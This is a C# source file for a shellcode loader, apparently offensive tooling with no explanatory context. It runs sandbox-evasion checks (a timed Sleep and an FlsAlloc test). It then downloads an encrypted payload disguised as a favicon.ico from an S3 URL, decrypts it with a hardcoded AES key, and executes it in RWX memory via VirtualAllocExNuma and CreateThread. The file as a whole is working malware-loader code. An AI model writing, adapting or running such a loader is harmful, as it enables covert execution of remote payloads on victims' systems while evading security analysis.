using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace Run
{
    public class Code
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static byte[] Unlock(byte[] locked, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform unlocker = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] unlocked;

                using (MemoryStream msDecrypt = new MemoryStream(locked))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, unlocker, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            unlocked = msPlain.ToArray();
                        }
                    }
                }

                return unlocked;
            }
        }

        public static async Task Main()
        {
            byte[] key = new byte[] {
0x4b,0x14,0xba,0xb2,0x83,0xc7,0x8b,0x66,0x00,0xde,0x5a,0xa0,
0x64,0x9f,0xe3,0xc1,0x98,0xda,0xde,0x24,0xd6,0x32,0xb4,0xe5,
0x53,0xea,0x4c,0x2f,0x22,0x22,0x35,0x63 };
            byte[] iv = new byte[] {
0xa5,0x66,0x6f,0x00,0x02,0x8b,0x70,0x64,0xc7,0xc9,0xd0,0xe9,
0x0e,0xa2,0xbc,0x05 };


            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            //string remoteResource = "http://192.168.18.129/favicon.ico";
            string remoteResource = "https://devanshll.s3.amazonaws.com/favicon.ico";
            string fileContent = await DownloadFileAsync(remoteResource);
            //var bytes_filecont = Encoding.UTF8.GetBytes(fileContent);
            byte[] fBt = ConvertHexStringToByteArray(fileContent);
            byte[] unlocked = Unlock(fBt, key, iv);
            //byte[] unlocked = { 0 };
            int size = unlocked.Length;
            uint sizeUint = (uint)size;

            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, sizeUint, 0x3000, 0x40, 0);
            Marshal.Copy(unlocked, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        static async Task<string> DownloadFileAsync(string url)
        {
            // Cria uma instância do HttpClient
            using (HttpClient client = new HttpClient())
            {

                string content = await client.GetStringAsync(url);
                return content;
            }
        }

        static byte[] ConvertHexStringToByteArray(string hexString)
        {
            // Remove quebras de linha, espaços em branco e outros caracteres indesejados
            hexString = Regex.Replace(hexString, @"\s+|\n|\r", "");

            // Separa os elementos pela vírgula
            string[] hexValues = hexString.Split(',');

            // Inicializa o array de bytes
            byte[] bytes = new byte[hexValues.Length];

            // Converte cada valor hexadecimal para byte
            for (int i = 0; i < hexValues.Length; i++)
            {
                if (hexValues[i].StartsWith("0x"))
                {
                    hexValues[i] = hexValues[i].Substring(2); // Remove o prefixo "0x"
                }
                bytes[i] = Convert.ToByte(hexValues[i], 16);
            }

            return bytes;
        }
    }
}